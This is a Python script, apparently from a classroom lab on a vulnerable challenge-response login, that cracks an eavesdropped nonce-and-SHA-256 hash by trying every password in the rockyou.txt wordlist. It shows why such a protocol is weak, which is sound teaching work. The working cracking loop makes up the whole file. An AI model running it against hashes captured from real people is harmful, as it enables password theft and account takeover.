"""
attacker.py — The Attacker (Eavesdropper)
Vulnerable Authentication Protocol - Figure 2

How it works:
  1. the attacker uses Wireshark on Kali (172.20.10.10) to sniff
     the traffic between Alice (172.20.10.2) and Bob (172.20.10.9)
  2. from Wireshark the attacker copies the captured nonce and hash
  3. the attacker then runs an offline dictionary attack using rockyou.txt
     trying every password until one produces a matching hash

Functions in this file:
  compute_hash(password, nonce)
      same function used by Alice and Bob, the attacker uses it
      to hash each password guess and compare it to the captured hash

  run_dictionary_attack(captured_nonce, captured_hash, wordlist_path)
      opens rockyou.txt and tries every password one by one
      hashes each guess with the captured nonce and checks if it matches

  main()
      takes the captured nonce and hash and launches the dictionary attack

Built-in stuff we use:
  hashlib    — to hash each password guess with SHA-256
  .encode()  — turns a string into bytes for hashing
  .strip()   — removes spaces and newline characters from each line in the wordlist
"""

import hashlib

# terminal colors
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"



# path to the wordlist file
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"


def compute_hash(password: str, nonce: str) -> str:
    # same as Alice and Bob — stick password and nonce together and SHA-256 it
    data = (password + nonce).encode()
    return hashlib.sha256(data).hexdigest()


def run_dictionary_attack(captured_nonce: str, captured_hash: str, wordlist_path: str):
    print(f"{CYAN}[ATTACKER] captured nonce : {captured_nonce}{RESET}")
    print(f"{CYAN}[ATTACKER] captured hash  : {captured_hash}{RESET}")
    print(f"\n{YELLOW}[ATTACKER] starting dictionary attack using '{wordlist_path}'...{RESET}\n")

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for line_number, line in enumerate(f, start=1):
                guess = line.strip()  # remove spaces and newline from each word

                # hash this guess the same way Alice would
                hashed_guess = compute_hash(guess, captured_nonce)

                # print progress every 100k attempts so we know its still running
                if line_number % 100000 == 0:
                    print(f"{YELLOW}[ATTACKER] tried {line_number} passwords... still going{RESET}")

                # if this guess matches what Alice sent then we found the password
                if hashed_guess == captured_hash:
                    print(f"\n{GREEN}[ATTACKER] ✅ password cracked after {line_number} attempts!{RESET}")
                    print(f"{GREEN}[ATTACKER] Alice's password is: {guess}{RESET}\n")
                    return

        print(f"{RED}[ATTACKER] ❌ password not found in wordlist.{RESET}")

    except FileNotFoundError:
        print(f"{RED}[ATTACKER] wordlist not found at '{wordlist_path}' — check the path.{RESET}")


def main():
    print(GREEN + r"""
    _  _____  _____  _    ___ _  __ ___ ___
   /_\|_   _||_   _|/_\  / __| |/ /| __|| _ \
  / _ \ | |    | | / _ \| (__| ' < | _| |   /
 /_/ \_\|_|    |_|/_/ \_\\___|_|\_\|___||_|_\
""" + RESET)
    print(f"{CYAN}  Eavesdropper Attack — Vulnerable Authentication Protocol")
    print(f"  Attacker IP  : 172.20.10.10")
    print(f"  Target Alice : 172.20.10.2")
    print(f"  Target Bob   : 172.20.10.9{RESET}\n")

    # ask the attacker to paste the values captured from Wireshark
    print(f"{YELLOW}[ATTACKER] paste the values you captured from Wireshark{RESET}\n")
    CAPTURED_NONCE = input(f"{YELLOW}[ATTACKER] enter captured nonce : {RESET}").strip()
    CAPTURED_HASH  = input(f"{YELLOW}[ATTACKER] enter captured hash  : {RESET}").strip()

    # launch the offline dictionary attack with what we captured from Wireshark
    run_dictionary_attack(CAPTURED_NONCE, CAPTURED_HASH, WORDLIST_PATH)


if __name__ == "__main__":
    main()
